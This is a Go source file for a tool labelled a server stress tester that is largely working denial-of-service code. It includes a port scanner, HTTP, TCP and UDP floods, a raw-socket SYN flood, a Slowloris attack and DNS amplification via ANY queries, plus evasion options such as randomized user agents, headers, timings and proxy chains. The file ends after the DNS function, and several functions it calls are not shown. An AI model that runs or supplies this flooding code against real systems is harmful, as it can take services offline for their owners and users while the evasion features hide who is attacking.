package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
)

// Configuration parameters
type Config struct {
	// Target information
	TargetURL       string
	TargetIP        string
	TargetPorts     []int
	CustomPortRange string

	// Test parameters
	TestDuration      time.Duration
	NumRequests       int
	Concurrency       int
	MaxPorts          int
	ScanTimeout       time.Duration
	ConnectionTimeout time.Duration
	ProgressInterval  time.Duration

	// Attack configuration
	EnablePortScan       bool
	EnableHTTPFlood      bool
	EnableTCPFlood       bool
	EnableUDPFlood       bool
	EnableSYNFlood       bool
	EnableSlowloris      bool
	EnableDNSAmplify     bool
	EnableICMPFlood      bool
	EnableHTTP2Flood     bool
	EnableSSLRenegotiate bool
	EnableWebSocketTest  bool
	EnableAPIFuzzing     bool
	EnableGraphQLTest    bool

	// Resource constraints
	MaxMemoryMB        int
	MaxFileDescriptors int
	MaxGoroutines      int

	// Testing methodology
	WarmupDuration   time.Duration
	CooldownDuration time.Duration
	ProgressiveLoad  bool
	ProgressiveSteps int

	// Evasion techniques
	RandomizeUserAgent bool
	RandomizeHeaders   bool
	UseProxyChain      bool
	ProxyList          string
	RandomizeTimings   bool
	TimingMin          time.Duration
	TimingMax          time.Duration

	// Monitoring and logging
	LogFile         string
	VerboseLogging  bool
	EnableMetrics   bool
	MetricsInterval time.Duration
}

// Statistics and metrics
type Metrics struct {
	mu               sync.Mutex
	StartTime        time.Time
	TotalRequests    int64
	SuccessRequests  int64
	FailedRequests   int64
	BytesSent        int64
	BytesReceived    int64
	ResponseTimes    []time.Duration
	OpenPorts        []int
	ActiveGoroutines int
}

// Global variables
var (
	config        Config
	metrics       Metrics
	ctx           context.Context
	cancel        context.CancelFunc
	logger        *log.Logger
	userAgents    []string
	customHeaders []string
)

func init() {
	// Custom user agents for randomization
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
	}

	// Custom headers for randomization
	customHeaders = []string{
		"Accept-Language: en-US,en;q=0.9",
		"Accept-Encoding: gzip, deflate, br",
		"Cache-Control: no-cache",
		"Pragma: no-cache",
		"DNT: 1",
		"Upgrade-Insecure-Requests: 1",
	}
}

func main() {
	// Set up signal handling for graceful shutdown
	ctx, cancel = context.WithCancel(context.Background())
	defer cancel()

	setupSignalHandling()
	parseFlags()
	setupLogging()
	printBanner()

	metrics.StartTime = time.Now()

	// Start metrics reporting in background
	if config.EnableMetrics {
		go reportMetrics(ctx)
	}

	logger.Printf("Starting server stress test against %s (%s)", config.TargetURL, config.TargetIP)
	logger.Printf("Test will run for %v with %d concurrent connections", config.TestDuration, config.Concurrency)

	// Perform port scanning if enabled
	var openPorts []int
	if config.EnablePortScan {
		openPorts = scanPorts(ctx, config.TargetIP)
		metrics.OpenPorts = openPorts
		if len(config.TargetPorts) > 0 {
			// If specific ports were provided, use those instead
			openPorts = config.TargetPorts
			logger.Printf("Using specified target ports: %v", openPorts)
		} else if len(openPorts) == 0 {
			// If no open ports found, use default ports
			openPorts = []int{80, 443, 8080}
			logger.Printf("No open ports found, using default ports: %v", openPorts)
		}
	} else if len(config.TargetPorts) > 0 {
		// If port scan is disabled but specific ports were provided
		openPorts = config.TargetPorts
		logger.Printf("Using specified target ports: %v", openPorts)
	} else {
		// Default case
		openPorts = []int{80, 443, 8080}
		logger.Printf("Using default ports: %v", openPorts)
	}

	// Warm-up period if enabled
	if config.WarmupDuration > 0 {
		logger.Printf("Starting warm-up period for %v...", config.WarmupDuration)
		warmupCtx, warmupCancel := context.WithTimeout(ctx, config.WarmupDuration)
		runWarmup(warmupCtx, openPorts)
		warmupCancel()
		logger.Printf("Warm-up completed")
	}

	// Create a context with timeout for the main test
	testCtx, testCancel := context.WithTimeout(ctx, config.TestDuration)
	defer testCancel()

	// Start the tests
	var wg sync.WaitGroup

	// HTTP Flood
	if config.EnableHTTPFlood {
		wg.Add(1)
		go func() {
			defer wg.Done()
			httpFlood(testCtx)
		}()
	}

	// TCP Flood
	if config.EnableTCPFlood && len(openPorts) > 0 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			tcpFlood(testCtx, openPorts)
		}()
	}

	// UDP Flood
	if config.EnableUDPFlood && len(openPorts) > 0 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			udpFlood(testCtx, openPorts)
		}()
	}

	// SYN Flood (improved implementation)
	if config.EnableSYNFlood && len(openPorts) > 0 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			synFlood(testCtx, openPorts)
		}()
	}

	// Slowloris Attack
	if config.EnableSlowloris && len(openPorts) > 0 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			slowlorisAttack(testCtx, openPorts)
		}()
	}

	// DNS Amplification
	if config.EnableDNSAmplify {
		wg.Add(1)
		go func() {
			defer wg.Done()
			dnsAmplificationAttack(testCtx)
		}()
	}

	// ICMP Flood
	if config.EnableICMPFlood {
		wg.Add(1)
		go func() {
			defer wg.Done()
			icmpFlood(testCtx)
		}()
	}

	// HTTP/2 Rapid Reset
	if config.EnableHTTP2Flood {
		wg.Add(1)
		go func() {
			defer wg.Done()
			http2RapidReset(testCtx)
		}()
	}

	// SSL/TLS Renegotiation
	if config.EnableSSLRenegotiate {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sslRenegotiationAttack(testCtx, openPorts)
		}()
	}

	// WebSocket Connection Exhaustion
	if config.EnableWebSocketTest {
		wg.Add(1)
		go func() {
			defer wg.Done()
			webSocketExhaustion(testCtx)
		}()
	}

	// API Fuzzing
	if config.EnableAPIFuzzing {
		wg.Add(1)
		go func() {
			defer wg.Done()
			apiFuzzing(testCtx)
		}()
	}

	// GraphQL Complexity Attack
	if config.EnableGraphQLTest {
		wg.Add(1)
		go func() {
			defer wg.Done()
			graphQLComplexityAttack(testCtx)
		}()
	}

	// Wait for all tests to complete or context to be cancelled
	go func() {
		wg.Wait()
		logger.Printf("All tests completed")
		testCancel()
	}()

	// Wait for test completion
	<-testCtx.Done()
	if testCtx.Err() == context.DeadlineExceeded {
		logger.Printf("Test duration reached")
	}

	// Cooldown period if enabled
	if config.CooldownDuration > 0 {
		logger.Printf("Starting cooldown period for %v...", config.CooldownDuration)
		time.Sleep(config.CooldownDuration)
		logger.Printf("Cooldown completed")
	}

	// Final metrics report
	reportFinalMetrics()
	logger.Printf("Server stress test completed")
}

func parseFlags() {
	// Default configuration
	config = Config{
		TargetURL:          "http://127.0.0.1",
		TargetIP:           "127.0.0.1",
		TestDuration:       2 * time.Minute,
		NumRequests:        10000,
		Concurrency:        50,
		MaxPorts:           1000,
		ScanTimeout:        2 * time.Second,
		ConnectionTimeout:  5 * time.Second,
		ProgressInterval:   5 * time.Second,
		MaxMemoryMB:        1024,
		MaxFileDescriptors: 1000,
		MaxGoroutines:      1000,
		WarmupDuration:     10 * time.Second,
		CooldownDuration:   10 * time.Second,
		ProgressiveLoad:    false,
		ProgressiveSteps:   5,
		EnablePortScan:     true,
		EnableHTTPFlood:    true,
		EnableTCPFlood:     true,
		EnableUDPFlood:     true,
		EnableSYNFlood:     true,
		EnableSlowloris:    true,
		RandomizeUserAgent: false,
		RandomizeHeaders:   false,
		RandomizeTimings:   false,
		TimingMin:          100 * time.Millisecond,
		TimingMax:          2 * time.Second,
		LogFile:            "stress_test.log",
		VerboseLogging:     false,
		EnableMetrics:      true,
		MetricsInterval:    10 * time.Second,
	}

	// Define command-line flags
	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "Target URL to test")
	flag.StringVar(&config.TargetIP, "ip", config.TargetIP, "Target IP address")
	flag.StringVar(&config.CustomPortRange, "ports", "", "Specific ports to target (comma-separated or range, e.g. 80,443,8000-8080)")
	flag.DurationVar(&config.TestDuration, "duration", config.TestDuration, "Test duration")
	flag.IntVar(&config.NumRequests, "requests", config.NumRequests, "Number of requests")
	flag.IntVar(&config.Concurrency, "concurrency", config.Concurrency, "Concurrent connections")
	flag.IntVar(&config.MaxPorts, "max-ports", config.MaxPorts, "Maximum ports to scan")
	flag.DurationVar(&config.ScanTimeout, "scan-timeout", config.ScanTimeout, "Port scan timeout")
	flag.DurationVar(&config.ConnectionTimeout, "conn-timeout", config.ConnectionTimeout, "Connection timeout")

	// Attack flags
	flag.BoolVar(&config.EnablePortScan, "port-scan", config.EnablePortScan, "Enable port scanning")
	flag.BoolVar(&config.EnableHTTPFlood, "http-flood", config.EnableHTTPFlood, "Enable HTTP flood attack")
	flag.BoolVar(&config.EnableTCPFlood, "tcp-flood", config.EnableTCPFlood, "Enable TCP flood attack")
	flag.BoolVar(&config.EnableUDPFlood, "udp-flood", config.EnableUDPFlood, "Enable UDP flood attack")
	flag.BoolVar(&config.EnableSYNFlood, "syn-flood", config.EnableSYNFlood, "Enable SYN flood attack")
	flag.BoolVar(&config.EnableSlowloris, "slowloris", config.EnableSlowloris, "Enable Slowloris attack")
	flag.BoolVar(&config.EnableDNSAmplify, "dns-amplify", false, "Enable DNS amplification attack")
	flag.BoolVar(&config.EnableICMPFlood, "icmp-flood", false, "Enable ICMP/Ping flood")
	flag.BoolVar(&config.EnableHTTP2Flood, "http2-flood", false, "Enable HTTP/2 rapid reset attack")
	flag.BoolVar(&config.EnableSSLRenegotiate, "ssl-renegotiate", false, "Enable SSL/TLS renegotiation attack")
	flag.BoolVar(&config.EnableWebSocketTest, "websocket-test", false, "Enable WebSocket connection exhaustion")
	flag.BoolVar(&config.EnableAPIFuzzing, "api-fuzzing", false, "Enable API endpoint fuzzing")
	flag.BoolVar(&config.EnableGraphQLTest, "graphql-test", false, "Enable GraphQL complexity attack")

	// Resource constraints
	flag.IntVar(&config.MaxMemoryMB, "max-memory", config.MaxMemoryMB, "Maximum memory usage in MB")
	flag.IntVar(&config.MaxFileDescriptors, "max-fd", config.MaxFileDescriptors, "Maximum file descriptors")
	flag.IntVar(&config.MaxGoroutines, "max-goroutines", config.MaxGoroutines, "Maximum number of goroutines")

	// Testing methodology
	flag.DurationVar(&config.WarmupDuration, "warmup", config.WarmupDuration, "Warmup duration")
	flag.DurationVar(&config.CooldownDuration, "cooldown", config.CooldownDuration, "Cooldown duration")
	flag.BoolVar(&config.ProgressiveLoad, "progressive", config.ProgressiveLoad, "Enable progressive load testing")
	flag.IntVar(&config.ProgressiveSteps, "progressive-steps", config.ProgressiveSteps, "Number of steps in progressive load test")

	// Evasion techniques
	flag.BoolVar(&config.RandomizeUserAgent, "random-ua", config.RandomizeUserAgent, "Randomize User-Agent headers")
	flag.BoolVar(&config.RandomizeHeaders, "random-headers", config.RandomizeHeaders, "Randomize HTTP headers")
	flag.BoolVar(&config.UseProxyChain, "use-proxy", false, "Use proxy chain for HTTP attacks")
	flag.StringVar(&config.ProxyList, "proxy-list", "", "Comma-separated list of proxies (http://proxy:port)")
	flag.BoolVar(&config.RandomizeTimings, "random-timing", config.RandomizeTimings, "Randomize request timing")
	flag.DurationVar(&config.TimingMin, "timing-min", config.TimingMin, "Minimum request timing")
	flag.DurationVar(&config.TimingMax, "timing-max", config.TimingMax, "Maximum request timing")

	// Logging and metrics
	flag.StringVar(&config.LogFile, "log-file", config.LogFile, "Log file path")
	flag.BoolVar(&config.VerboseLogging, "verbose", config.VerboseLogging, "Enable verbose logging")
	flag.BoolVar(&config.EnableMetrics, "metrics", config.EnableMetrics, "Enable metrics collection")
	flag.DurationVar(&config.MetricsInterval, "metrics-interval", config.MetricsInterval, "Metrics reporting interval")

	// Parse flags
	flag.Parse()

	// Process custom port range if provided
	if config.CustomPortRange != "" {
		config.TargetPorts = parsePortRange(config.CustomPortRange)
	}

	// Process proxy list if provided
	if config.ProxyList != "" {
		// proxies := strings.Split(config.ProxyList, ",")
	}
}

func parsePortRange(portRange string) []int {
	var ports []int
	portParts := strings.Split(portRange, ",")

	for _, part := range portParts {
		// Check if it's a range (e.g., 8000-8080)
		if strings.Contains(part, "-") {
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) == 2 {
				var start, end int
				fmt.Sscanf(rangeParts[0], "%d", &start)
				fmt.Sscanf(rangeParts[1], "%d", &end)
				if start > 0 && end > start && end <= 65535 {
					for i := start; i <= end; i++ {
						ports = append(ports, i)
					}
				}
			}
		} else {
			// Single port
			var port int
			fmt.Sscanf(part, "%d", &port)
			if port > 0 && port <= 65535 {
				ports = append(ports, port)
			}
		}
	}

	return ports
}

func setupLogging() {
	// Create log file
	logFile, err := os.OpenFile(config.LogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}

	// Create multi-writer to log to both file and stdout
	multiWriter := io.MultiWriter(os.Stdout, logFile)
	logger = log.New(multiWriter, "", log.LstdFlags)
}

func printBanner() {
	banner := `
 ███████╗████████╗██████╗ ███████╗███████╗███████╗    ████████╗███████╗███████╗████████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
 ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗       ██║   █████╗  ███████╗   ██║   
 ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║       ██║   ██╔══╝  ╚════██║   ██║   
 ███████║   ██║   ██║  ██║███████╗███████║███████║       ██║   ███████╗███████║   ██║   
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
                                                                                        
                        Advanced Server Stress Testing Tool
`
	fmt.Println(banner)
}

func setupSignalHandling() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		logger.Printf("Received termination signal. Shutting down gracefully...")
		cancel()
		// Allow time for goroutines to clean up
		time.Sleep(2 * time.Second)
		logger.Printf("Exiting")
		os.Exit(0)
	}()
}

func scanPorts(ctx context.Context, ip string) []int {
	logger.Printf("Scanning open ports on %s (timeout: %v)...", ip, config.ScanTimeout)
	var openPorts []int
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Create semaphore to limit concurrent scans
	sem := make(chan struct{}, 500)

	// Create a context with timeout for the scan
	scanCtx, scanCancel := context.WithTimeout(ctx, 2*time.Minute)
	defer scanCancel()

	for port := 1; port <= config.MaxPorts; port++ {
		// Check if context is done
		select {
		case <-scanCtx.Done():
			logger.Printf("Port scan cancelled or timed out")
			goto ScanComplete
		default:
			// Continue with scan
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(port int) {
			defer wg.Done()
			defer func() { <-sem }()

			address := fmt.Sprintf("%s:%d", ip, port)
			d := net.Dialer{Timeout: config.ScanTimeout}
			conn, err := d.DialContext(scanCtx, "tcp", address)

			if err == nil {
				mu.Lock()
				openPorts = append(openPorts, port)
				mu.Unlock()
				conn.Close()

				if config.VerboseLogging {
					logger.Printf("Port %d is open", port)
				}
			}
		}(port)
	}

ScanComplete:
	wg.Wait()
	logger.Printf("Port scan completed. Found %d open ports: %v", len(openPorts), openPorts)
	return openPorts
}

func httpFlood(ctx context.Context) {
	logger.Printf("Starting HTTP flood against %s with %d concurrent connections", config.TargetURL, config.Concurrency)

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: config.ConnectionTimeout,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			MaxConnsPerHost:     config.Concurrency,
			IdleConnTimeout:     30 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
		},
	}

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Create HTTP request
					req, err := http.NewRequestWithContext(ctx, "GET", config.TargetURL, nil)
					if err != nil {
						logError("HTTP request creation error", err)
						continue
					}

					// Add common headers
					req.Header.Set("Connection", "keep-alive")

					// Add random User-Agent if enabled
					if config.RandomizeUserAgent {
						req.Header.Set("User-Agent", getRandomUserAgent())
					} else {
						req.Header.Set("User-Agent", userAgents[0])
					}

					// Add random headers if enabled
					if config.RandomizeHeaders {
						addRandomHeaders(req)
					}

					// Execute request
					resp, err := client.Do(req)

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					if err != nil {
						metrics.FailedRequests++
						metrics.mu.Unlock()
						continue
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Read and close response body
					if resp != nil {
						if resp.Body != nil {
							body, _ := io.ReadAll(resp.Body)
							resp.Body.Close()

							metrics.mu.Lock()
							metrics.BytesReceived += int64(len(body))
							metrics.mu.Unlock()
						}
					}

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("HTTP flood test completed")
}

func tcpFlood(ctx context.Context, ports []int) {
	logger.Printf("Starting TCP flood with %d concurrent connections on %d ports", config.Concurrency, len(ports))

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Create buffer for random data
			buf := make([]byte, 4096)

			for {
				select {
				case <-ctx.Done():
					return
				case portIndex := <-ch:
					port := ports[portIndex%len(ports)]
					address := fmt.Sprintf("%s:%d", config.TargetIP, port)

					// Create dialer with timeout
					dialer := net.Dialer{Timeout: config.ConnectionTimeout}
					conn, err := dialer.DialContext(ctx, "tcp", address)

					if err != nil {
						logError(fmt.Sprintf("TCP connection error to %s", address), err)
						continue
					}

					// Generate random data
					rand.Read(buf) // rand.Read is deprecated

					// Set write deadline
					conn.SetWriteDeadline(time.Now().Add(config.ConnectionTimeout))

					// Send data
					n, err := conn.Write(buf)
					if err != nil {
						logError("TCP write error", err)
					}

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					metrics.BytesSent += int64(n)
					if err != nil {
						metrics.FailedRequests++
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Close connection
					conn.Close()

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("TCP flood test completed")
}

func udpFlood(ctx context.Context, ports []int) {
	logger.Printf("Starting UDP flood with %d concurrent connections on %d ports", config.Concurrency, len(ports))

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Create buffer for random data
			buf := make([]byte, 1024)

			for {
				select {
				case <-ctx.Done():
					return
				case portIndex := <-ch:
					port := ports[portIndex%len(ports)]
					address := fmt.Sprintf("%s:%d", config.TargetIP, port)

					// Resolve UDP address
					addr, err := net.ResolveUDPAddr("udp", address)
					if err != nil {
						logError(fmt.Sprintf("UDP address resolution error for %s", address), err)
						continue
					}

					// Create UDP connection
					conn, err := net.DialUDP("udp", nil, addr)
					if err != nil {
						logError(fmt.Sprintf("UDP connection error to %s", address), err)
						continue
					}

					// Generate random data
					rand.Read(buf)

					// Send data
					n, err := conn.Write(buf)

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					metrics.BytesSent += int64(n)
					if err != nil {
						metrics.FailedRequests++
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Close connection
					conn.Close()

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("UDP flood test completed")
}

// Improved SYN Flood - sends SYN packets without completing the handshake
func synFlood(ctx context.Context, ports []int) {
	logger.Printf("Starting SYN flood with %d concurrent connections on %d ports", config.Concurrency, len(ports))

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case portIndex := <-ch:
					port := ports[portIndex%len(ports)]
					// address := fmt.Sprintf("%s:%d", config.TargetIP, port)

					// Create raw socket for sending SYN packets
					conn, err := net.Dial("ip4:tcp", config.TargetIP) // Note: Requires raw socket privileges (eg: sudo in linux)

					if err != nil {
						// Log error but don't exit, try other ports
						logError(fmt.Sprintf("Raw socket connection error to %s", config.TargetIP), err)
						continue
					}

					// Craft a SYN packet (simplified, no TCP options)
					// we can use a library like gopacket for more control
					synPacket := []byte{
						0x00, 0x50, // Source port (random, can be any)
						byte(port >> 8), byte(port), // Destination port
						0x00, 0x00, 0x00, 0x00, // Sequence number (can be any)
						0x00, 0x00, 0x00, 0x00, // Acknowledgment number
						0x50, 0x02, // Data offset, flags (SYN flag set)
						0x00, 0x00, // Window size
						0x00, 0x00, // Checksum (should be calculated correctly)
						0x00, 0x00, // Urgent pointer
					}

					// Generate a random source port for each packet
					srcPort := uint16(rand.Intn(65535-1024) + 1024)
					synPacket[0] = byte(srcPort >> 8)
					synPacket[1] = byte(srcPort)

					// Calculate TCP checksum (#TODO use gopacket for this)
					checksum := calculateTCPChecksum(synPacket, getLocalIP(), net.ParseIP(config.TargetIP))
					synPacket[16] = byte(checksum >> 8)
					synPacket[17] = byte(checksum)

					// Send the SYN packet
					_, err = conn.Write(synPacket)
					if err != nil {
						logError("SYN packet send error", err)
					}
					metrics.mu.Lock()
					metrics.TotalRequests++

					if err != nil {
						metrics.FailedRequests++
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Close connection
					conn.Close()

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("SYN flood test completed")
}

func calculateTCPChecksum(data []byte, srcAddr, dstAddr net.IP) uint16 {
	// Length of the TCP segment (header + data)
	length := len(data)

	// Build the pseudo-header
	pseudoHeader := make([]byte, 0, 12)
	pseudoHeader = append(pseudoHeader, srcAddr.To4()...) // Source IP
	pseudoHeader = append(pseudoHeader, dstAddr.To4()...) // Destination IP
	pseudoHeader = append(pseudoHeader, 0)                // Zero
	pseudoHeader = append(pseudoHeader, 6)                // Protocol (TCP)
	pseudoHeader = append(pseudoHeader, byte(length>>8))  // TCP length (high byte)
	pseudoHeader = append(pseudoHeader, byte(length))     // TCP length (low byte)

	// Initialize checksum to 0
	var csum uint32

	// Calculate sum of pseudo-header
	for i := 0; i < len(pseudoHeader); i += 2 {
		csum += uint32(pseudoHeader[i]) << 8
		if i+1 < len(pseudoHeader) {
			csum += uint32(pseudoHeader[i+1])
		}
	}

	// Calculate sum of TCP segment
	for i := 0; i < length; i += 2 {
		csum += uint32(data[i]) << 8
		if i+1 < length {
			csum += uint32(data[i+1])
		}
	}

	// Add carries
	for csum > 0xffff {
		csum = (csum >> 16) + (csum & 0xffff)
	}

	// Take one's complement
	return ^uint16(csum)
}

func getLocalIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80") // Use a dummy connection to get local IP
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP
}

func slowlorisAttack(ctx context.Context, ports []int) {
	logger.Printf("Starting Slowloris attack with %d concurrent connections", config.Concurrency)

	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			var conn net.Conn
			var err error
			portIndex := 0
			targetPort := ports[portIndex%len(ports)] // Start with the first open port

			for {
				select {
				case <-ctx.Done():
					if conn != nil {
						conn.Close()
					}
					return
				default:
					// If no connection, or previous connection failed, try to establish a new one
					if conn == nil {
						address := fmt.Sprintf("%s:%d", config.TargetIP, targetPort)
						dialer := net.Dialer{Timeout: config.ConnectionTimeout}
						conn, err = dialer.DialContext(ctx, "tcp", address)

						if err != nil {
							metrics.mu.Lock()
							metrics.TotalRequests++
							metrics.FailedRequests++
							metrics.mu.Unlock()

							// Log the error and switch to the next open port
							logError(fmt.Sprintf("Slowloris connection error to %s", address), err)
							portIndex = (portIndex + 1) % len(ports) // Cycle through open ports
							targetPort = ports[portIndex]
							continue
						}

						metrics.mu.Lock()
						metrics.TotalRequests++
						metrics.SuccessRequests++
						metrics.mu.Unlock()

						// Send initial HTTP request headers
						fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
						if config.RandomizeUserAgent {
							fmt.Fprintf(conn, "User-Agent: %s\r\n", getRandomUserAgent())
						} else {
							fmt.Fprintf(conn, "User-Agent: %s\r\n", userAgents[0])
						}

						fmt.Fprintf(conn, "Host: %s\r\n", config.TargetIP)
						fmt.Fprintf(conn, "Accept: */*\r\n")
					}

					// Send headers slowly
					if config.RandomizeHeaders {
						for _, header := range customHeaders {
							fmt.Fprintf(conn, "%s\r\n", header)
							time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax)) // Slow send
						}

					} else {
						fmt.Fprintf(conn, "Connection: keep-alive\r\n")
					}

					fmt.Fprintf(conn, "Content-Length: 42\r\n") // Bogus header

					// Wait for the slow send interval
					select {
					case <-ctx.Done(): // Check if context is done during sleep
						if conn != nil {
							conn.Close()
						}
						return
					case <-time.After(getRandomDuration(10*time.Second, 20*time.Second)): // Slow send
						// Continue loop
					}

				}
			}
		}(i)
	}
	wg.Wait()
	logger.Printf("slowloris attack done")
}

func dnsAmplificationAttack(ctx context.Context) {
	logger.Printf("Starting DNS Amplification attack simulation")
	// List of DNS servers - use own controlled DNS servers
	// DO NOT use public DNS servers like these - they are only listed as examples
	resolvers := []string{
		"8.8.8.8:53", // Google DNS (example only - DO NOT USE in real tests)
		"1.1.1.1:53", // Cloudflare DNS (example only - DO NOT USE in real tests)
		// own controlled DNS servers here
	}
	// The domain to query - this would be a domain you are testing
	targetDomain := "example.com"
	// For ANY queries - these generate large responses suitable for amplification testing
	dnsType := uint16(255) // DNS Type ANY (0xFF)

	logger.Printf("DNS Amplification test using %d workers against domain: %s", config.Concurrency, targetDomain)

	// Create a semaphore to limit concurrent socket creation
	sem := make(chan struct{}, 100)

	// Create channel for work distribution
	ch := make(chan int, config.Concurrency)

	// Create worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Acquire semaphore
			sem <- struct{}{}
			defer func() { <-sem }()

			// Create a UDP connection
			conn, err := net.ListenPacket("udp", ":0") // Bind to a random local port
			if err != nil {
				logError("Failed to create UDP connection", err)
				return // Skip this worker
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ch:
					// Select a random resolver from the list
					resolverAddr := resolvers[rand.Intn(len(resolvers))]

					// Craft a DNS query packet
					// Reference: https://www.ietf.org/rfc/rfc1035.txt
					query := createDNSQuery(targetDomain, dnsType)

					// Resolve the UDP address of the DNS server
					raddr, err := net.ResolveUDPAddr("udp", resolverAddr)
					if err != nil {
						logError(fmt.Sprintf("Failed to resolve UDP address %s", resolverAddr), err)
						continue
					}

					// Send the query
					n, err := conn.WriteTo(query, raddr)

					// Update metrics
					metrics.mu.Lock()
					metrics.TotalRequests++
					metrics.BytesSent += int64(n)
					if err != nil {
						metrics.FailedRequests++
						logError("Failed to send DNS query", err)
					} else {
						metrics.SuccessRequests++
					}
					metrics.mu.Unlock()

					// Random delay if timing randomization is enabled
					if config.RandomizeTimings {
						time.Sleep(getRandomDuration(config.TimingMin, config.TimingMax))
					}
				}
			}
		}(i)
	}

	// Send work to the pool
	go func() {
		for i := 0; i < config.NumRequests; i++ {
			select {
			case <-ctx.Done():
				return
			case ch <- i:
				// Work sent
			}
		}
	}()

	// Wait for context cancellation
	<-ctx.Done()
	logger.Printf("DNS Amplification attack simulation completed")
}

